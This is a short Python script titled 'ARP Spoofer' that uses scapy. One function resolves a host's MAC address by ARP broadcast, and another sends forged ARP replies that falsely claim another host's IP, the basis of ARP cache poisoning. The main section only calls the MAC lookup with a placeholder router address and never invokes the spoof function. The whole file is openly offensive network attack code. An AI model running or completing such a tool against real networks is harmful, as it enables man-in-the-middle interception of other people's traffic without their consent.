#!/usr/bin/env python3

# Script Name:      ARP Spoofer
# Author:           Vincent Bailey
# Last Rev:         04/6/2023
# Purpose:          This script will act as an ARP spoofer.

##############################################################################
# Libraries
##############################################################################
import scapy.all as scapy


##############################################################################
# Global Variables
##############################################################################



##############################################################################
# Spoof Function
##############################################################################
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    scapy.send(packet)


##############################################################################
# Scan Function
##############################################################################
def get_mac(ip):
    # This line searches for the IP address range on a network.
    arp_request = scapy.ARP(pdst=ip)
    # arp_request.show()  # shows packet details

    # This line searches for the MAC address field on a network.
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # broadcast.show()  # shows packet details

    # scapy allows us to append both of the variables above with the line below.
    arp_request_broadcast = broadcast / arp_request

    # this line will send and receive packets using scapy's "srp" method.
    # srp abbreviated for "send / receive packets"
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


##############################################################################
# Main
##############################################################################
get_mac("insert router IP here")

##############################################################################
# End
##############################################################################
